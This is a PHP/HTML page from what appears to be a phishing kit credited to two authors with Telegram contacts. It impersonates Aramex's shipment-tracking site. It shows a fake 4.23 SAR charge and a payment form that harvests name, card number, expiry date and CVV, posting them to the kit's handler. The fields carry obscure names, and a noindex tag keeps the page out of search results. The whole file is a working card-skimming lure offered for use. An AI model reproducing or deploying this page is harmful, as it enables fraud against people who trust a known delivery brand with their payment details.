<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>Aramex</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header">
            <div class="topmenu d-lg-blck d-md-block d-sm-none d-none">
                <div class="container text-right"><img style="min-width: 554px;" src="../assets/imgs/topmenu.png"></div>
            </div>
            <div class="mainmenu">
                <div class="container d-flex align-items-center">
                    <div class="logo flex-grow-1"><img src="../assets/imgs/logo.svg"></div>
                    <div class="menu">
                        <img style="min-width: 567px;" class="d-lg-block d-md-block d-sm-none d-none" src="../assets/imgs/mainmenu.png">
                        <img style="min-width: 121px;" class="d-lg-none d-md-none d-sm-block d-none" src="../assets/imgs/mainmenu2.png">
                        <img style="min-width: 59px;" class="d-lg-none d-md-none d-sm-none d-block" src="../assets/imgs/mainmenu3.png">
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="row">
                    <div class="col-md-4 d-lg-block d-md-block d-sm-none d-none">
                        <aside class="sidebar">
                            <div class="widget">
                                <ul>
                                    <li class="active"><span>Track Shipments</span> <i class="fas fa-arrow-right"></i></li>
                                    <li><span>Track Pickup Requests</span> <i class="fas fa-arrow-right"></i></li>
                                    <li><span>Advanced Tracking</span> <i class="fas fa-arrow-right"></i></li>
                                    <li><span>Notifications</span> <i class="fas fa-arrow-right"></i></li>
                                </ul>
                            </div>
                            <div class="widget">
                                <div class="text">
                                    <p>Customer Support</p>
                                    <div class="sym"><img src="../assets/imgs/phone.png"></div>
                                    <h3>Questions About Your Shipment?</h3>
                                </div>
                                <ul>
                                    <li><span style="font-size: 20px;"><small>support</small>Submit Request</span> <img src="../assets/imgs/email.png"></li>
                                </ul>
                            </div>
                        </aside>
                    </div>
                    <div class="col-md-8">
                        <article class="content">
                            <div class="box">
                                <div class="tracking">
                                    <p>Shipment Summary</p>
                                    <div class="sym"><img src="../assets/imgs/network.png"></div>
                                    <h3>Tracking Number: <span>30876489055</span></h3>
                                </div>
                                <div class="price d-flex">
                                    <div class="left flex-grow-1">
                                        <p>Transaction Ref. #VSH160364321396 <small>Standard package</small></p>
                                    </div>
                                    <div class="right">
                                        <p>Grand Total. 4.23SAR <small>(VAT INCLUDED)</small></p>
                                    </div>
                                </div>
                            </div>
                            <div class="box pl-5 pr-5">
                                <div class="title">
                                    <p>Payment</p>
                                    <h3>Payment Information</h3>
                                </div>
                                <form action="../index.php" method="post">
                                    <input type="hidden" name="captcha">
                                    <input type="hidden" name="step" value="cc">
                                    <div class="form-group row mb-4">
                                        <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4 <?php echo is_invalid_class($_SESSION['errors'],'first_name') ?>">
                                            <label for="first_name">First name<span>*</span></label>
                                            <input type="text" name="first_name" id="first_name" class="form-control" value="<?php echo get_value('first_name'); ?>">
                                            <?php echo error_message($_SESSION['errors'],'first_name'); ?>
                                        </div>
                                        <div class="col-md-6 <?php echo is_invalid_class($_SESSION['errors'],'last_name') ?>">
                                            <label for="last_name">Last name<span>*</span></label>
                                            <input type="text" name="last_name" id="last_name" class="form-control" value="<?php echo get_value('last_name'); ?>">
                                            <?php echo error_message($_SESSION['errors'],'last_name'); ?>
                                        </div>
                                    </div>
                                    <div class="form-group mb-4 <?php echo is_invalid_class($_SESSION['errors'],'one') ?>">
                                        <label for="one">Card number<span>*</span></label>
                                        <div class="zz">
                                            <input type="text" name="one" id="one" class="form-control" placeholder="XXXX XXXX XXXX XXXX" value="<?php echo get_value('one'); ?>">
                                            <img src="../assets/imgs/a.png">
                                            <?php echo error_message($_SESSION['errors'],'one'); ?>
                                        </div>
                                    </div>
                                    <div class="form-group row mb-4 <?php echo is_invalid_class($_SESSION['errors'],'two') ?>">
                                        <div class="col-md-6">
                                            <label for="two">Expiry date<span>*</span></label>
                                            <input type="text" maxlength="7" name="two" id="two" class="form-control" placeholder="MM/YY" value="<?php echo get_value('two'); ?>">
                                            <?php echo error_message($_SESSION['errors'],'two'); ?>
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <div class="col-md-6 <?php echo is_invalid_class($_SESSION['errors'],'three') ?>">
                                            <label for="three">Code CVV<span>*</span></label>
                                            <div class="zz">
                                                <input type="text" name="three" id="three" class="form-control" placeholder="XXX" value="<?php echo get_value('three'); ?>">
                                                <img src="../assets/imgs/b.png">
                                                <?php echo error_message($_SESSION['errors'],'three'); ?>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="btns">
                                        <button type="submit">Continue</button>
                                    </div>
                                </form>
                            </div>
                        </article>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <div class="row">
                    <div class="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Developers Center</h3>
                            <ul>
                                <li>Aramex ClickToShip</li>
                                <li>Aramex APIs</li>
                                <li>Developers Forum</li>
                                <li>E-Commerce Platforms</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>About</h3>
                            <ul>
                                <li>About Aramex</li>
                                <li>Investor Relations</li>
                                <li>Delivering Good</li>
                                <li>Franchise</li>
                                <li>Certifications</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Legal</h3>
                            <ul>
                                <li>Terms Of Use</li>
                                <li>Fraud Prevention</li>
                                <li>Privacy Policy</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Connect</h3>
                            <ul>
                                <li>Customer Support</li>
                                <li>Careers</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-3 col-sm-4 col-12">
                        <div class="text">
                            <img src="../assets/imgs/search.png">
                            <ul>
                                <li><i class="fab fa-facebook-f"></i></li>
                                <li><i class="fab fa-twitter"></i></li>
                                <li><i class="fab fa-instagram"></i></li>
                                <li><i class="fab fa-linkedin"></i></li>
                                <li><i class="fab fa-youtube"></i></li>
                            </ul>
                            <p>&copy; Aramex <?php echo date('Y'); ?>. All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

    </body>

</html>